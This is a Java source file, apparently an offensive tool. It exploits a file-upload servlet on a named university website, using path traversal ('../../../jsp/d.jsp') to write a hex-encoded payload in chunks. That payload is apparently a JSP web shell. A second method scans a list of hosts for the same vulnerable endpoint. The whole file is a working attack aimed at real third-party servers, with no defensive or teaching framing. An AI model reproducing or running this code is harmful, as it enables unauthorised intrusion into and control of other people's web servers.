package qgb.project.ccsu;

import java.io.InputStream;

import com.gargoylesoftware.htmlunit.Version;

import qgb.T;
import qgb.file.F;
import qgb.jdbc.Mysql;
import qgb.net.HttpRequest;
import qgb.project.JDBC_Test;

public class WriteJsp {

	public static void main(String[] args) {
		String sthex=T.read_st("c.txt");
		//T.print(sthex);
		T.print(sthex.length());//3109*4
		for (int i = 0; i < 4; i++) {
			T.print(sthex.substring(3109*i, 3109*(i+1)));
			HttpRequest.post("http://zsjy.ccsu.cn/servlet/com.cicro.cws.htmleditor.wordFileUpload", "filename=../../../jsp/d.jsp&filepath=/&file="
							+sthex.substring(3109*i, 3109*(i+1)));
			try {
				Thread.sleep(999);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		//
		//GetTomcatVersion();
	}

	private static void GetTomcatVersion() {
		String stin= T.read_st("sld.txt"),sta="";
		InputStream is;
		//T.print(stin);
		String[] yst=stin.split("\n");
		int in=0;
		for (int i = 0; i < yst.length; i++) {
			yst[i]=yst[i].substring(0,yst[i].length()-1);
			sta="http://"+yst[i]+"/servlet/com.cicro.cws.htmleditor.wordFileUpload";
			try {
				is= HttpRequest.get(sta);
				T.write("/v/"+yst[i]+".html", is);
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			//T.print(sta);
		}
		//T.print(yst);
	}
	
}
